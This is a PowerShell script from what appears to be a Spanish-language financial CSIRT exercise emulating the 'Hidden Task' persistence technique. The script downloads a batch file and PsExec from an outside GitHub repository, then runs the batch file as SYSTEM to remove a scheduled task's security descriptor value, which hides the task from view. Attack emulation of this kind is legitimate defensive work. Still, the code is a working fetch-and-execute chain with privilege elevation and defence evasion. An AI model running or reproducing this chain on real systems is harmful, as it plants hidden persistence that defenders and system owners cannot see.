# Configuración inicial
try {
    $Host.UI.RawUI.BackgroundColor = "Black"
    Clear-Host
    Write-Host "[CSIRT FINANCIERO AHIBA, Emulacion de la tecnica Hiddent Task]" -ForegroundColor Green
	Write-Host "[Actividad 02 descarga de archivos para ocultar la tarea programada eliminado el valor de la llave SD]" -ForegroundColor 			Green

}
catch {
    Write-Host "Error al configurar la interfaz: $_" -ForegroundColor Red
	Write-Host "Presiona cualquier tecla para salir..." -ForegroundColor Green
	$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}

# Crear el directorio de descarga
try {
	Start-Sleep -s 1
	Write-Host " " -ForegroundColor Green
	Start-Sleep -s 1
    Write-Host "Creando el directorio de descarga."  -ForegroundColor Green
	Start-Sleep -s 1
	Write-Host "."  -ForegroundColor Green
	Start-Sleep -s 1
	Write-Host "." -ForegroundColor Green
	Start-Sleep -s 1
	Write-Host "." -ForegroundColor Green

    # Obtener la ruta del directorio del usuario actual
    $directorioTemporal = $env:HOMEPATH

    # Crear el directorio donde se van a descargar los archivos necesarios para ejecutar las acciones maliciosas
    $workingPath = "HiddenTask"
    $nuevaRuta = Join-Path -Path $directorioTemporal -ChildPath $workingPath

    if (-not (Test-Path -Path $nuevaRuta)) {
        New-Item -ItemType Directory -Path $nuevaRuta -ErrorAction Stop
    }
}
catch {
    Write-Host "Error al crear el directorio de descarga: $_" -ForegroundColor Red
	Write-Host "Presiona cualquier tecla para salir..." -ForegroundColor Green
	$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}

# Descargar el archivo de GitHub
try {
    Write-Host "Descargando archivos desde GitHub..." -ForegroundColor Green

    $urlArchivoMal = "https://github.com/taysec/Test_HiddenTask/raw/main/HiddenTask%20with%20SD%20value%20Removal/SD_Removal.bat"
    $urlArchivoPSexec = "https://github.com/taysec/Test_HiddenTask/raw/main/HiddenTask%20with%20SD%20value%20Removal/PsExec.exe"

    $fileName = "SD_Removal.bat"
    $fileName2 = "PSExec.exe"
    $rutaArchivo = Join-Path -Path $nuevaRuta -ChildPath $fileName
    $rutaPSexec = Join-Path -Path $nuevaRuta -ChildPath $fileName2

    Invoke-WebRequest -Uri $urlArchivoMal -OutFile $rutaArchivo
    Invoke-WebRequest -Uri $urlArchivoPSexec -OutFile $rutaPSexec
}
catch {
    Write-Host "Error al descargar los archivos: $_" -ForegroundColor Red
	Write-Host "Presiona cualquier tecla para salir..." -ForegroundColor Green
	$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}

# Elevación de privilegios a través de psexec ejecutando lanzador de GhostTask
try {
	Start-Sleep -s 1
    Write-Host "Elevando privilegios para eliminar el valor SD..." -ForegroundColor Green
	Start-Sleep -s 1.5
    Start-Process -FilePath $rutaPSexec -ArgumentList "-accepteula", "-i", "-s", $rutaArchivo -Verb "runas"
    Write-Host "Privilegios elevados correctamente para eliminar el valor SD." -ForegroundColor Green
    Write-Host "Presiona cualquier tecla para cerrar PowerShell"
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}
catch {
    Write-Host "Error al elevar los privilegios: $_" -ForegroundColor Red
	Write-Host "Presiona cualquier tecla para salir..." -ForegroundColor Green
	$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}
